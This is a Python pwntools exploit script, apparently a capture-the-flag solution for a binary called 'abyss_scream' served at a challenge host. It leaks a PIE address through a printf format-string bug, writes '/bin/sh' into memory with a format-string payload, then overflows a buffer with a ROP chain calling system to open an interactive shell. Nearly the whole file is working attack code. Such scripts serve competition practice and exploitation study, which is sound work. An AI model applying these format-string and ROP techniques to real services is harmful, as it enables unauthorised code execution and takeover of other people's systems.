#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./abyss_scream", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc chall.polygl0ts.ch 9001"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}


def exec_fmt(payload):
    context.log_level = "CRITICAL"
    io = start()
    io.sendline(b"x")
    io.sendline(b"name")
    io.sendline(payload)
    io.recvuntil(b"Your message:\n")
    resp = io.recvline()
    io.close()
    context.log_level = "INFO"
    return resp


# fp = FmtStr(execute_fmt=exec_fmt)
offset = 8  # fp.offset


def printf_leak(idx):
    io.sendline(b"x")
    io.sendline(b"Name")
    payload = f"%{idx}$llx".encode()
    io.sendline(payload)
    io.recvuntil(b"Your message:\n")
    leak = io.recvline().strip()
    print(leak)
    return int(leak, 16)


io = start()
pie_leak = printf_leak(30)
log.info(f"{pie_leak=:#x}")
elf.address = pie_leak - 0x131e
assert elf.address & 0xfff == 0
log.info(f"{elf.address=:#x}")
pop_rdi = elf.sym["nothing_to_see_here"] + 8
ret = pop_rdi + 1
payload = fmtstr_payload(offset=offset,
                         writes={elf.bss(0xc00): u64(b"/bin/sh\x00")})
io.sendline(b"x")
io.sendline(b"name")
io.clean()
print(len(payload))
io.sendline(payload)
io.sendline(b"x")
io.sendline(b"name")
payload = b"A" * 0x110
payload += flat(
    elf.bss(0xd00),
    pop_rdi, elf.bss(0xc00),
    ret,
    elf.plt["system"],
)
io.sendline(payload)
io.interactive()
